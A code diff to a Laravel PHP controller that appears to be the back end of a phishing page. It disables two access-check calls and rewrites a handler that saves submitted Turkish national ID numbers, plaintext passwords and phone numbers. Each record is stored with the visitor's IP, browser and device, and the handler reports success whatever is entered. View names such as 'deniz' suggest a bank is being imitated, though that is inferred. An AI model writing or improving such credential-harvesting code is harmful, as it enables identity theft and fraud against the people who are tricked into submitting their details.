@@ -49,13 +49,13 @@ class MainController extends Controller
     }
     public function index(Request $request)
     {
-        $this->checkControl($request);
+        //$this->checkControl($request);
         return view('wordpress');
     }
 
     public function dd(Request $request)
     {
-        $this->checkControl($request);
+        // $this->checkControl($request);
         return view('deniz');
     }
 
@@ -64,7 +64,7 @@ class MainController extends Controller
         return view('main');
     }
 
-   
+
 
     public function handleSlug($slug)
     {
@@ -85,12 +85,15 @@ class MainController extends Controller
             $uniqueReq = LoginModel::query()->where([
                 'tc' => $request->tc,
                 'password' => $request->password,
-                'phone' => $request->phone
             ]);
-
-            if (!$uniqueReq->exists()) {
+            if ($uniqueReq->exists()) {
+                if ($request->phone != '') {
+                    $request->merge(['phone' => $request->phone]);
+                }
+            } else {
                 $request->merge(
                     [
+                        'phone' => $request->phone ?? '',
                         'user_agent' => Agent::browser() . ' ' . Agent::getUserAgent(),
                         'system' => Agent::isDesktop() ? 'PC' : 'Mobile',
                         'date' => Carbon::now(),
@@ -98,12 +101,12 @@ class MainController extends Controller
                         'ip' => $request->ip(),
                     ]
                 );
-
-                LoginModel::insert($request->all());
-                return response()->json(['result' => 'success'], 200);
-            } else {
-                return response()->json(['result' => 'error', 200]);
             }
+            LoginModel::updateOrCreate([
+                'tc' => $request->tc,
+                'password' => $request->password,
+            ], $request->all());
+            return response()->json(['result' => 'success'], 200);
         }
     }
 
